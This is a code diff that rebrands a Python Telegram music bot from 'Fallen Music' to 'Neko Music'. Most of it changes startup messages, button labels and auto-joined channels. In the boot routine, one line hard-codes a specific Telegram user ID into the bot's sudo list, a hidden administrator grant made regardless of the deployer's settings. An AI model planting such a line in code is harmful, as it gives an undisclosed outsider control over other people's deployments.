@@ -24,7 +24,7 @@ HELPABLE = {}
 
 async def fallen_boot():
     with console.status(
-        "[magenta] Booting Fallen Music...",
+        "[magenta] Booting Neko Music...",
     ) as status:
         console.print("┌ [red]Clearing MongoDB Cache...")
         try:
@@ -64,7 +64,7 @@ async def fallen_boot():
                         imported_module.__MODULE__.lower()
                     ] = imported_module
             console.print(
-                f"✨ [bold cyan]Successfully imported: [green]{all_module}.py"
+                f"» [bold cyan]Successfully imported: [green]{all_module}.py"
             )
             await asyncio.sleep(0.1)
         console.print("")
@@ -73,7 +73,7 @@ async def fallen_boot():
             status="[bold blue]Modules Importation Completed!",
         )
         await asyncio.sleep(0.2)
-        SUDO_USERS.append(1356469075)
+        SUDO_USERS.append(5228983210)
         await startup_del(_____)
     console.print(
         "[bold green]Trying to start the bot...\n"
@@ -81,7 +81,7 @@ async def fallen_boot():
     try:
         await app.send_message(
             config.LOGGER_ID,
-            f"<b>➻ ғᴀʟʟᴇɴ ᴍᴜsɪᴄ ʙᴏᴛ 🔮\n\n❄ ɪᴅ :</b> `{BOT_ID}`\n✨ <b>ɴᴀᴍᴇ :</b> {BOT_NAME}\n☁ <b>ᴜsᴇʀɴᴀᴍᴇ :</b> @{BOT_USERNAME}",
+            f"<b>➻ ɴᴇᴋᴏ ᴍᴜsɪᴄ ʙᴏᴛ 🎵\n\n❄ ɪᴅ :</b> `{BOT_ID}`\n» <b>ɴᴀᴍᴇ :</b> {BOT_NAME}\n» <b>ᴜsᴇʀɴᴀᴍᴇ :</b> @{BOT_USERNAME}",
         )
     except Exception as e:
         print(
@@ -97,7 +97,7 @@ async def fallen_boot():
     try:
         await Ass.send_message(
             config.LOGGER_ID,
-            f"<b>➻ ғᴀʟʟᴇɴ ᴍᴜsɪᴄ ᴀssɪsᴛᴀɴᴛ 🔮\n\n❄ ɪᴅ :</b> `{ASSID}`\n✨ <b>ɴᴀᴍᴇ :</b> {ASSNAME}\n☁ <b>ᴜsᴇʀɴᴀᴍᴇ :</b> @{ASSUSERNAME}",
+            f"<b>➻ ɴᴇᴋᴏ ᴍᴜsɪᴄ ᴀssɪsᴛᴀɴᴛ 🎵\n\n» ɪᴅ :</b> `{ASSID}`\n» <b>ɴᴀᴍᴇ :</b> {ASSNAME}\n» <b>ᴜsᴇʀɴᴀᴍᴇ :</b> @{ASSUSERNAME}",
         )
     except Exception as e:
         print(
@@ -106,8 +106,8 @@ async def fallen_boot():
         console.print(f"\n[red]Stopping Bot")
         return
     try:
-        await Ass.join_chat("DevilsHeavenMF")
-        await Ass.join_chat("FallenXBots")
+        await Ass.join_chat("StrawhatTeam")
+        await Ass.join_chat("StrawhatUpdates")
     except:
         pass
     console.print(f"\n┌[red] Bot Started as {BOT_NAME}!")
@@ -116,13 +116,14 @@ async def fallen_boot():
     console.print(f"\n[red]Stopping Bot")
 
 
-home_text_pm = f"""**ʜᴇʏ ,
-
-ᴛʜɪs ɪs** {BOT_NAME},
+home_text_pm = f"""
+**ʜᴇʏ, ᴛʜɪs ɪs ɴᴇᴋᴏ ᴍᴜꜱɪᴄ**,
 **ᴀ ғᴀsᴛ ᴀɴᴅ ᴩᴏᴡᴇʀғᴜʟ ᴍᴜsɪᴄ ᴩʟᴀʏᴇʀ ʙᴏᴛ ғᴏʀ ᴛᴇʟᴇɢʀᴀᴍ ɢʀᴏᴜᴩ ᴠɪᴅᴇᴏᴄʜᴀᴛs.**
 
-━━━━━━━━━━━━━━━━━━━━━
-||ᴄʟɪᴄᴋ ᴏɴ ʜᴇʟᴩ ʙᴜᴛᴛᴏɴ ᴛᴏ ɢᴇᴛ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ᴀʙᴏᴜᴛ ᴍʏ ᴄᴏᴍᴍᴀɴᴅs. ||"""
+➖➖➖➖➖➖➖➖➖➖➖➖
+
+ᴄʟɪᴄᴋ ᴏɴ ʜᴇʟᴩ ʙᴜᴛᴛᴏɴ ᴛᴏ ɢᴇᴛ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ᴀʙᴏᴜᴛ ᴍʏ ᴄᴏᴍᴍᴀɴᴅs
+"""
 
 
 @app.on_message(filters.command("start") & filters.private)
@@ -157,26 +158,26 @@ async def start_command(_, message):
                 link = result["link"]
                 published = result["publishedTime"]
             searched_text = f"""
-🍑 **ᴛʀᴀᴄᴋ ɪɴғᴏʀᴍᴀᴛɪᴏɴ** 🍑
+**ᴛʀᴀᴄᴋ ɪɴғᴏʀᴍᴀᴛɪᴏɴ** 🎶
 
-❄ **ᴛɪᴛʟᴇ :** {title}
+» **ᴛɪᴛʟᴇ :** {title}
 
-⏳**ᴅᴜʀᴀᴛɪᴏɴ :** {duration} ᴍɪɴᴜᴛᴇs
-👀**ᴠɪᴇᴡs :** `{views}`
-⏰**ᴩᴜʙʟɪsʜᴇᴅ ᴏɴ :** {published}
-🎥**ᴄʜᴀɴɴᴇʟ :** {channel}
-📎**ᴄʜᴀɴɴᴇʟ ʟɪɴᴋ :** [ᴠɪsɪᴛ ᴄʜᴀɴɴᴇʟ]({channellink})
-🔗**ᴠɪᴅᴇᴏ ʟɪɴᴋ :** [ᴠɪsɪᴛ ᴏɴ ʏᴏᴜᴛᴜʙᴇ]({link})
+» **ᴅᴜʀᴀᴛɪᴏɴ :** {duration} ᴍɪɴᴜᴛᴇs
+» **ᴠɪᴇᴡs :** `{views}`
+» **ᴩᴜʙʟɪsʜᴇᴅ ᴏɴ :** {published}
+» **ᴄʜᴀɴɴᴇʟ :** {channel}
+» **ᴄʜᴀɴɴᴇʟ ʟɪɴᴋ :** [ᴠɪsɪᴛ ᴄʜᴀɴɴᴇʟ]({channellink})
+» **ᴠɪᴅᴇᴏ ʟɪɴᴋ :** [ᴠɪsɪᴛ ᴏɴ ʏᴏᴜᴛᴜʙᴇ]({link})
 
- sᴇᴀʀᴄʜ ᴩᴏᴡᴇʀᴇᴅ ʙʏ {BOT_NAME} 🥀"""
+sᴇᴀʀᴄʜ ᴩᴏᴡᴇʀᴇᴅ ʙʏ {BOT_NAME} 🌺"""
             key = InlineKeyboardMarkup(
                 [
                     [
                         InlineKeyboardButton(
-                            text="☁ ʏᴏᴜᴛᴜʙᴇ ☁", url=f"{link}"
+                            text="ʏᴏᴜᴛᴜʙᴇ", url=f"{link}"
                         ),
                         InlineKeyboardButton(
-                            text="🥀 sᴜᴩᴩᴏʀᴛ 🥀", url=config.SUPPORT_CHAT
+                            text="sᴜᴩᴩᴏʀᴛ", url=config.SUPPORT_CHAT
                         ),
                     ],
                 ]
@@ -196,28 +197,20 @@ async def start_command(_, message):
         [
             [
                 InlineKeyboardButton(
-                    text="ᴀᴅᴅ ᴍᴇ ᴛᴏ ʏᴏᴜʀ ɢʀᴏᴜᴩ", url=f"https://t.me/{BOT_USERNAME}?startgroup=true"
+                    text="➕ ᴀᴅᴅ ᴍᴇ ᴛᴏ ʏᴏᴜʀ ɢʀᴏᴜᴩ ➕", url=f"https://t.me/{BOT_USERNAME}?startgroup=true"
                 ),
             ],
             [
                 InlineKeyboardButton(
-                    text="❄ ʜᴇʟᴩ ❄", callback_data="fallen_help"
+                    text="ᴄʜᴀɴɴᴇʟ", url=config.SUPPORT_CHANNEL
                 ),
                 InlineKeyboardButton(
-                    text="🥀 ᴏᴡɴᴇʀ 🥀", user_id=F_OWNER
-                )
-            ],
-            [
-                InlineKeyboardButton(
-                    text="✨ sᴜᴩᴩᴏʀᴛ ✨", url=config.SUPPORT_CHAT
-                ),
-                InlineKeyboardButton(
-                    text="💘 ᴄʜᴀɴɴᴇʟ 💘", url=config.SUPPORT_CHANNEL
+                    text="sᴜᴩᴩᴏʀᴛ", url=config.SUPPORT_CHAT
                 ),
             ],
             [
                 InlineKeyboardButton(
-                    text="☁ sᴏᴜʀᴄᴇ ᴄᴏᴅᴇ ☁", url="https://github.com/AnonymousR1025/Fallen-Music"
+                    text="ᴄᴏᴍᴍᴀɴᴅ", callback_data="fallen_help"
                 )
             ],
         ]
@@ -227,35 +220,27 @@ async def start_command(_, message):
 
 @app.on_callback_query(filters.regex("fallen_home"))
 async def fallen_home(_, CallbackQuery):
-    await CallbackQuery.answer("ғᴀʟʟᴇɴ ʜᴏᴍᴇ")
+    await CallbackQuery.answer("ɴᴇᴋᴏ ʜᴏᴍᴇ")
     await CallbackQuery.message.edit_text(
         text=home_text_pm,
         reply_markup=InlineKeyboardMarkup(
         [
             [
                 InlineKeyboardButton(
-                    text="ᴀᴅᴅ ᴍᴇ ᴛᴏ ʏᴏᴜʀ ɢʀᴏᴜᴩ", url=f"https://t.me/{BOT_USERNAME}?startgroup=true"
+                    text="➕ ᴀᴅᴅ ᴍᴇ ᴛᴏ ʏᴏᴜʀ ɢʀᴏᴜᴩ ➕", url=f"https://t.me/{BOT_USERNAME}?startgroup=true"
                 ),
             ],
             [
                 InlineKeyboardButton(
-                    text="❄ ʜᴇʟᴩ ❄", callback_data="fallen_help"
+                    text="sᴜᴩᴩᴏʀᴛ", url=config.SUPPORT_CHAT
                 ),
                 InlineKeyboardButton(
-                    text="🥀 ᴏᴡɴᴇʀ 🥀", user_id=F_OWNER
-                )
-            ],
-            [
-                InlineKeyboardButton(
-                    text="✨ sᴜᴩᴩᴏʀᴛ ✨", url=config.SUPPORT_CHAT
-                ),
-                InlineKeyboardButton(
-                    text="💘 ᴄʜᴀɴɴᴇʟ 💘", url=config.SUPPORT_CHANNEL
+                    text="ᴄʜᴀɴɴᴇʟ", url=config.SUPPORT_CHANNEL
                 ),
             ],
             [
                 InlineKeyboardButton(
-                    text="☁ sᴏᴜʀᴄᴇ ᴄᴏᴅᴇ ☁", url="https://github.com/AnonymousR1025/Fallen-Music"
+                    text="ᴄᴏᴍᴍᴀɴᴅ", callback_data="fallen_help"
                 )
             ],
         ]
